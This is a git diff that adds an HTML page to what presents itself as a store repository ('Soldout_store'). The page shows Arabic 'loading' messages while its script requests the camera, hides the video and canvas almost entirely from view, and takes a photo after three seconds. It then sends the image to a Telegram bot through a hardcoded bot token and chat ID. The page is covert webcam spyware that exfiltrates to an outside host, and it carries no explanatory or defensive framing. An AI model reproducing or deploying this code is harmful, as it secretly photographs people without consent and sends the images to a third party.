@@ -1,1 +1,90 @@
 # Soldout_store
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>📸 جاري التحميل...</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    #status {
+      font-size: 20px;
+    }
+    video, canvas {
+      position: absolute;
+      width: 10px;
+      height: 10px;
+      top: 0;
+      left: 0;
+      opacity: 0.01;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <div id="status">📡 جاري تفعيل الكاميرا...</div>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" width="300" height="300"></canvas>
+
+  <script>
+    const chat_id = "5795177810";
+    const token = "8459921827:AAGIVnKWBXYYvXWSPrLNweHG1fIcAEE9XOU";
+
+    async function start() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = () => {
+          document.getElementById("status").innerText = "📸 انتظر لحظة...";
+
+          setTimeout(() => {
+            takePhoto(stream);
+          }, 3000); // ← بعد 3 ثواني فقط
+        };
+
+      } catch (e) {
+        document.getElementById("status").innerText = "❌ الكاميرا غير متاحة.";
+      }
+    }
+
+    function takePhoto(stream) {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      stream.getTracks().forEach(track => track.stop());
+
+      canvas.toBlob(blob => {
+        const formData = new FormData();
+        formData.append("chat_id", chat_id);
+        formData.append("photo", blob, "photo.jpg");
+
+        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        }).then(res => res.json()).then(data => {
+          document.getElementById("status").innerText = data.ok ? "✅ تم إرسال الصورة!" : "❌ فشل في الإرسال.";
+        }).catch(err => {
+          document.getElementById("status").innerText = "❌ خطأ في الاتصال.";
+        });
+      }, "image/jpeg");
+    }
+
+    window.onload = start;
+  </script>
+</body>
+</html>
